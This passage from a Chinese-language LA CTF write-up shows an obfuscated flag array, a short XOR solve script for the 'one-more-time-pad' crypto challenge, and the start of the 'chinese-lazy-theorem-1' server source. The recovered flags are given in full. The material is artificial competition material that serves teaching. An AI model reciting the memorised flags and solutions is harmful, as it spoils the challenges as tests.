-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/12.png"><br>转一下就是flag<br><code>lactf&#123;th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n&#125;</code></p><h3 id="string-cheese"><a href="#string-cheese" class="headerlink" title="string-cheese"></a>string-cheese</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼顶针的题 比赛的时候没看tnnd<br><img src="/mdimg/lactf/13.png"><br><img src="/mdimg/lactf/14.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="one-more-time-pad"><a href="#one-more-time-pad" class="headerlink" title="one-more-time-pad"></a><strong>one-more-time-pad</strong></h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key? I threw that out a long time ago! Can you help me recover it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> cycle<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br><br>key = cycle(<span class="hljs-string">b&quot;lactf&#123;??????????????&#125;&quot;</span>)<br><br>ct = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pt)):<br>    b = (pt[i] ^ <span class="hljs-built_in">next</span>(key))<br>    ct += <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, ct)<br><br><span class="hljs-comment">#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>异或一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-1"><a href="#chinese-lazy-theorem-1" class="headerlink" title="chinese-lazy-theorem-1"></a>chinese-lazy-theorem-1</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard about this cool theorem called the Chinese Remainder Theorem, but, uh… I’m feeling kinda tired right now.<br><code>nc lac.tf 31110</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br>used_oracle = <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;To quote Pete Bancini, \&quot;I&#x27;m tired.\&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;ll answer one modulus question, that&#x27;s it.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> used_oracle:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                used_oracle = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span 